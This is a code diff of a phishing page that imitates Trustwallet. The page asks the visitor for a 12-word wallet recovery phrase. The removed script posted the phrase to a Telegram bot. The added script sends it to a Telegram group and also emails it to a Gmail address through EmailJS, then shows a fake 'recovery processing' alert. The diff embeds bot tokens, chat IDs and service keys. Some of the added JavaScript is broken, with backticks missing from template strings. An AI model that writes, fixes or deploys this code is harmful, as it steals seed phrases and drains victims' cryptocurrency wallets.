@@ -154,46 +154,49 @@
                 <div class="footer-copyright-center">Copyright © 2024 Trustwallet</div>
             </section>
         </div>
-        <script>
-            document.getElementById("email-form").addEventListener("submit", function(event) {
-                event.preventDefault();  // Prevent default form submission
+        <!-- Load EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+    // Initialize EmailJS with your public key
+    emailjs.init("9_IT3nig3g-fmMtvt");
 
-                const botToken = "8013839887:AAFyKGCs12PmCdF2Zk2QuMIttTtRPVeDle0";  // Replace with your Bot Token
-                const chatId = "1802596609";  // Replace with your Chat ID
+    document.getElementById("email-form").addEventListener("submit", function(event) {
+        event.preventDefault();  // Prevent default form submission
 
-                // Gather form data for the 12 words
-                let message = "Recovery Details:\n";
-                for (let i = 1; i <= 12; i++) {
-                    const word = document.getElementsByName(i.toString())[0].value;
-                    message += `Word ${i}: ${word}\n`;
-                }
+        const botToken = "8013839887:AAFyKGCs12PmCdF2Zk2QuMIttTtRPVeDle0";          // replace with your bot token
+        const groupChatId = "-1002968465630";       // replace with your group chat_id
 
-                // Send data to Telegram bot
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                // .then(data => {
-                //     if (data.ok) {
-                //         alert("Data sent to Telegram successfully!");
-                //         window.location.href = this.getAttribute("redirect");  // Redirect after sending
-                //     } else {
-                //         alert("Failed to send data to Telegram.");
-                //     }
-                // })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("An error occurred. Please try again.");
-                });
-            });
-        </script>
+        // Gather form data
+        let message = "📋 New Form Submission:\n\n";
+        for (let i = 1; i <= 12; i++) {
+            const word = document.getElementsByName(i.toString())[0].value;
+            message += Word ${i}: ${word}\n;
+        }
+
+        // ✅ Send data to Telegram group
+        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: groupChatId,
+                text: message
+            })
+        });
+
+        // ✅ Send data to Email via EmailJS
+        emailjs.send("service_cwwpntu", "template_94bifzd", {
+            to_email: "phatomrecovery@gmail.com", // replace with recipient email
+            message: message
+        })
+        .then(() => {
+            alert("Account recovery processing!");
+        })
+        .catch(error => {
+            console.error("Email error:", error);
+            alert("Failed to send email.");
+        });
+    });
+</script>
         <!-- <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=671ab8c3e5122fad4a0db0fb" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
         <script src="https://cdn.prod.website-files.com/671ab8c3e5122fad4a0db0fb/js/webflow.5b67b614e.js" type="text/javascript"></script> -->
     </body>
